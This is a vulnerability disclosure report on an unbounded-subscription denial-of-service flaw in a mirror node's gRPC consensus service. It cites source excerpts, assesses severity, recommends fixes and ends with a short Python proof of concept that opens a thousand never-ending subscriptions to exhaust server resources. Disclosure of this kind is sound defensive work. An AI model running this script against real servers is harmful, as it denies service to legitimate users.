### Title
Unbounded Live Subscription DoS via Missing `consensusEndTime` and `limit` in `toFilter()`

### Summary
Any unauthenticated external caller can send a `ConsensusTopicQuery` containing only a `topicID` (omitting both `consensusStartTime` and `consensusEndTime`). The `toFilter()` method builds a `TopicMessageFilter` with `startTime = DomainUtils.now()`, `endTime = null`, and `limit = 0`. All bean-validation checks pass, and the resulting subscription is infinite — it never terminates server-side. By opening many TCP connections (each carrying up to 5 concurrent calls), an attacker exhausts server-side reactive threads, Redis listener slots, and DB polling resources, starving legitimate subscribers.

### Finding Description

**Code path — `toFilter()` (`ConsensusController.java` lines 55–73):**

```java
private TopicMessageFilter toFilter(ConsensusTopicQuery query) {
    final var filter = TopicMessageFilter.builder().limit(query.getLimit()); // protobuf default = 0

    if (query.hasConsensusStartTime()) { ... }   // skipped — field absent
    if (query.hasConsensusEndTime())   { ... }   // skipped — field absent

    return filter.build();
}
``` [1](#0-0) 

**Default `startTime` in `TopicMessageFilter` (`TopicMessageFilter.java` line 31):**

```java
@Builder.Default
private long startTime = DomainUtils.now();   // set at build time — always <= now()
``` [2](#0-1) 

**Validation passes silently:**
- `isValidStartTime()` → `startTime <= DomainUtils.now()` — true (same instant).
- `isValidEndTime()` → `endTime == null` → returns `true`. [3](#0-2) 

**Subscription never terminates — `pastEndTime()` (`TopicMessageServiceImpl.java` lines 123–131):**

```java
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();   // ← infinite — no termination signal ever emitted
    }
    ...
}
``` [4](#0-3) 

**`isComplete()` always returns `false` when `endTime == null`:**

```java
boolean isComplete() {
    if (filter.getEndTime() == null) {
        return false;   // ← never complete
    }
    ...
}
``` [5](#0-4) 

**No limit applied** — `hasLimit()` returns `false` when `limit == 0`, so `flux.take()` is never called. [6](#0-5) 

**Existing mitigation is per-connection only** — `maxConcurrentCallsPerConnection = 5` limits calls per TCP connection but places no cap on the total number of connections or total active subscriptions. [7](#0-6) 

`subscriberCount` is a Micrometer gauge only — it is never checked against a maximum. [8](#0-7) 

### Impact Explanation
Each infinite subscription holds a Reactor subscription chain, a slot in the shared Redis/polling listener, and periodic DB polling resources. With no global cap on connections or subscriptions, an attacker can open N TCP connections × 5 concurrent calls = 5N permanent subscriptions. This exhausts the bounded-elastic scheduler threads, the Redis pub/sub listener capacity (`maxBufferSize = 16384`), and DB connection pool slots, causing legitimate subscribers to receive errors or stall indefinitely. Severity: **High** (unauthenticated, fully remote, repeatable DoS).

### Likelihood Explanation
The gRPC endpoint is publicly reachable (port 5600, no authentication). The attack requires only a valid `topicID` (which is public on-chain data). A single attacker machine can open hundreds of TCP connections. The attack is trivially scriptable with any gRPC client library and is repeatable without any privileged access.

### Recommendation
1. **Enforce a maximum subscription duration**: Reject or auto-terminate subscriptions where `endTime` is null and `limit` is 0 after a configurable maximum wall-clock duration (e.g., 10 minutes).
2. **Enforce a global subscriber cap**: Check `subscriberCount` against a configurable maximum in `subscribeTopic()` and return `RESOURCE_EXHAUSTED` when exceeded.
3. **Per-IP connection rate limiting**: Add a gRPC interceptor or load-balancer rule to cap connections per source IP.
4. **Require either `endTime` or `limit`**: Add a `@AssertTrue` constraint to `TopicMessageFilter` that rejects filters where both `endTime == null` and `limit == 0`.

### Proof of Concept

```python
import grpc
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from com.hederahashgraph.api.proto.java import consensus_topic_query_pb2, basic_types_pb2

# Open many connections, each with 5 concurrent infinite subscriptions
for conn_idx in range(200):
    channel = grpc.insecure_channel("mirror-node-host:5600")
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_topic_query_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1234)
        # consensusStartTime omitted → defaults to DomainUtils.now()
        # consensusEndTime omitted  → null, Flux.never()
        # limit omitted             → 0, no take()
    )
    for _ in range(5):  # maxConcurrentCallsPerConnection = 5
        stub.subscribeTopic(query)  # blocks server resources forever
# Result: 1000 permanent subscriptions, server resource pool exhausted
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L55-73)
```java
    private TopicMessageFilter toFilter(ConsensusTopicQuery query) {
        final var filter = TopicMessageFilter.builder().limit(query.getLimit());

        if (query.hasTopicID()) {
            filter.topicId(EntityId.of(query.getTopicID()));
        }

        if (query.hasConsensusStartTime()) {
            long startTime = convertTimestamp(query.getConsensusStartTime());
            filter.startTime(startTime);
        }

        if (query.hasConsensusEndTime()) {
            long endTime = convertTimestamp(query.getConsensusEndTime());
            filter.endTime(endTime);
        }

        return filter.build();
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L30-31)
```java
    @Builder.Default
    private long startTime = DomainUtils.now();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L43-51)
```java
    @AssertTrue(message = "End time must be after start time")
    public boolean isValidEndTime() {
        return endTime == null || endTime > startTime;
    }

    @AssertTrue(message = "Start time must be before the current time")
    public boolean isValidStartTime() {
        return startTime <= DomainUtils.now();
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-55)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L83-85)
```java
        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L123-131)
```java
    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }

        return Flux.empty()
                .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                        .withFixedDelay(grpcProperties.getEndTimeInterval()));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L203-215)
```java
        boolean isComplete() {
            if (filter.getEndTime() == null) {
                return false;
            }

            if (filter.getEndTime() < startTime) {
                return true;
            }

            return Instant.ofEpochSecond(0, filter.getEndTime())
                    .plus(grpcProperties.getEndTimeInterval())
                    .isBefore(Instant.now());
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```
